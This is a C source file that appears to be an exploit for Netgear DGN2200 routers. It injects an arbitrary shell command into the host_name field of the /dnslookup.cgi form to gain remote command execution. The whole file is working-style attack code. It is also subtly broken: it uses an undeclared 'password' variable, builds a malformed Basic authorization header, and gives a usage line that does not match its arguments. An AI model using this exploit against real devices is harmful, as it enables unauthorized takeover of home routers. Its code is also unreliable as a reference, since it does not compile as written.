// "Netgear DGN2200v1, Netgear DGN2200v2, Netgear DGN2200v3", Netgear DGN2200v4

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 80

// Function to create an HTTP POST request
void create_http_post_request(const char *target_ip, const char *username, const char *password, const char *data, char *request, size_t request_size) {
    snprintf(request, request_size,
             "POST /dnslookup.cgi HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Authorization: Basic %s\r\n"
             "Connection: close\r\n"
             "Content-Length: %lu\r\n\r\n"
             "%s",
             target_ip, password, strlen(data), data);
}

// Function to send an HTTP POST request
int send_http_post_request(const char *target_ip, const char *username, const char *password, const char *data) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    char response[MAX_RESPONSE_SIZE];
    int bytes_received;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Create and send the HTTP POST request
    create_http_post_request(target_ip, username, password, data, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    // Receive the response
    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to execute a command
void execute_command(const char *target_ip, const char *username, const char *password, const char *cmd) {
    char payload[256];
    snprintf(payload, sizeof(payload), "www.google.com; %s", cmd);

    char data[512];
    snprintf(data, sizeof(data), "host_name=%s&lookup=Lookup", payload);

    send_http_post_request(target_ip, username, password, data);
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <username> <command>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *username = argv[2]; // Username from command line argument
    const char *cmd = argv[3]; // Command to execute from command line argument

    execute_command(target_ip, username, password, cmd);
    return EXIT_SUCCESS;
}
